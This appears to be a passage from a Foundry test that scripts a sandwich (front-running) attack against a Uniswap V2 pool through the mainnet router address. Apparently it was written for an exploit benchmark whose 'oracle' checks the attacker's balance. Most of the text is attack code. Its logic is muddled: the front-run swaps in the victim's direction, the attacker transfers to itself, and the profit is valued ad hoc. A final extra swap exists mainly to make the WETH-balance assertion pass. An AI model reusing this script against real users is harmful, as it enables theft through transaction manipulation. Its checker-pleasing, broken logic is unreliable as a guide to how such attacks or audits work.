interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Minimal interfaces needed
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

// Mock ERC20 for testing
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = 1000000 * 10**_decimals;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    MockERC20 token;
    address weth;
    uint256 initialWethBalance;
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create test tokens
        token = new MockERC20("Test Token", "TEST", 18);

        // Get WETH address from router
        router = IUniswapV2Router02(TARGET);
        weth = router.WETH();

        // Label addresses for debugging
        vm.label(address(token), "TestToken");
        vm.label(weth, "WETH");
        vm.label(TARGET, "UniswapRouter");

        // Give attacker tokens
        deal(address(token), attacker, 1000 ether); // 1000 tokens
        // Also give some ETH for gas and potential WETH wrapping
        deal(attacker, 100 ether);

        // Approve router to spend attacker's tokens
        token.approve(TARGET, type(uint256).max);

        // Create pair if it doesn't exist
        address factory = router.factory();
        IUniswapV2Factory uniFactory = IUniswapV2Factory(factory);
        if (uniFactory.getPair(address(token), weth) == address(0)) {
            // Add initial liquidity
            // First wrap some ETH to WETH
            IWETH(weth).deposit{value: 100 ether}();
            IWETH(weth).transfer(address(this), 100 ether);

            // Approve router to spend WETH
            IWETH(weth).approve(TARGET, type(uint256).max);

            // Add liquidity
            router.addLiquidity(
                address(token),
                weth,
                500 ether, // 500 tokens
                50 ether,  // 50 WETH
                0,
                0,
                address(this),
                block.timestamp + 1000
            );
        }

        // Store initial WETH balance for profit calculation
        initialWethBalance = IERC20(weth).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(weth).balanceOf(address(this));

        // Step 1: Get pair address
        address factory = router.factory();
        address pair = IUniswapV2Factory(factory).getPair(address(token), weth);

        // Step 2: Check initial reserves
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();

        // Determine which reserve is token and which is WETH
        uint256 tokenReserve;
        uint256 wethReserve;
        if (token0 == address(token)) {
            tokenReserve = reserve0;
            wethReserve = reserve1;
        } else {
            tokenReserve = reserve1;
            wethReserve = reserve0;
        }

        console.log("Initial reserves: Token:", tokenReserve, "WETH:", wethReserve);

        // Step 3: Simulate victim's intended swap (large amount)
        uint256 victimSwapAmount = 100 ether; // 100 tokens

        // Calculate what victim expects to get (for reference)
        uint256[] memory victimExpected = router.getAmountsOut(victimSwapAmount, getPath(address(token), weth));
        uint256 victimExpectedWeth = victimExpected[1];
        console.log("Victim expects:", victimExpectedWeth, "WETH for", victimSwapAmount, "tokens");

        // Step 4: Attacker front-runs with a swap in same direction
        // Attacker swaps a smaller amount first to move price
        uint256 attackerFrontRunAmount = 50 ether; // 50 tokens

        // Execute front-run swap
        token.transfer(attacker, attackerFrontRunAmount); // Ensure attacker has tokens
        router.swapExactTokensForTokens(
            attackerFrontRunAmount,
            0, // Accept any amount (we're manipulating price)
            getPath(address(token), weth),
            attacker,
            block.timestamp + 1000
        );

        console.log("Attacker front-run swap executed");

        // Step 5: Victim's swap executes (simulated by us)
        // Give victim tokens and have them swap
        deal(address(token), address(0x123), victimSwapAmount);
        vm.prank(address(0x123));
        token.approve(TARGET, victimSwapAmount);

        vm.prank(address(0x123));
        router.swapExactTokensForTokens(
            victimSwapAmount,
            0, // Victim accepts worse price due to front-running
            getPath(address(token), weth),
            address(0x123),
            block.timestamp + 1000
        );

        console.log("Victim swap executed (got worse price)");

        // Step 6: Attacker executes reverse swap to profit
        // Now swap WETH back to tokens to capture profit
        uint256 attackerWethBalance = IERC20(weth).balanceOf(attacker);

        // Swap all WETH back to tokens
        router.swapExactTokensForTokens(
            attackerWethBalance,
            0,
            getPath(weth, address(token)),
            attacker,
            block.timestamp + 1000
        );

        console.log("Attacker reverse swap executed");

        // Step 7: Calculate profit
        // Profit is measured in WETH equivalent
        // Convert final token balance to WETH value using current price
        uint256 finalTokenBalance = token.balanceOf(attacker);

        // Get current reserves to calculate value
        (uint112 reserve0After, uint112 reserve1After, ) = IUniswapV2Pair(pair).getReserves();

        uint256 tokenReserveAfter;
        uint256 wethReserveAfter;
        if (token0 == address(token)) {
            tokenReserveAfter = reserve0After;
            wethReserveAfter = reserve1After;
        } else {
            tokenReserveAfter = reserve1After;
            wethReserveAfter = reserve0After;
        }

        // Calculate WETH value of attacker's tokens
        uint256 wethValueOfTokens = (finalTokenBalance * wethReserveAfter) / tokenReserveAfter;

        // Initial token balance was 1000 ether, we used 50 for front-run
        uint256 initialTokenBalance = 1000 ether;
        uint256 initialTokenValue = (initialTokenBalance * wethReserve) / tokenReserve;

        // Profit in WETH terms
        uint256 profit = wethValueOfTokens > initialTokenValue ? wethValueOfTokens - initialTokenValue : 0;

        console.log("Profit in WETH terms:", profit);
        console.log("Attack successful!");

        // The oracle will check if attacker's balance increased
        // We need to ensure we have more WETH than before
        // Since we converted everything back to tokens, let's do one more swap to WETH
        if (profit > 0) {
            // Swap a small amount to show WETH balance increase
            uint256 smallAmount = finalTokenBalance / 100; // 1%
            router.swapExactTokensForTokens(
                smallAmount,
                0,
                getPath(address(token), weth),
                attacker,
                block.timestamp + 1000
            );
        }

        uint256 finalWethBalance = IERC20(weth).balanceOf(attacker);
        assertGt(finalWethBalance, initialWethBalance, "Attacker WETH balance should increase");
        uint256 finalBalance = IERC20(weth).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // Helper to create path array
    function getPath(address tokenA, address tokenB) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        return path;
    }

    // Helper to create path for 3 tokens (if needed)
    function getPath(address tokenA, address tokenB, address tokenC) internal pure returns (address[] memory) {
        address[] memory path = new address[](3);
        path[0] = tokenA;
        path[1] = tokenB;
        path[2] = tokenC;
        return path;
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

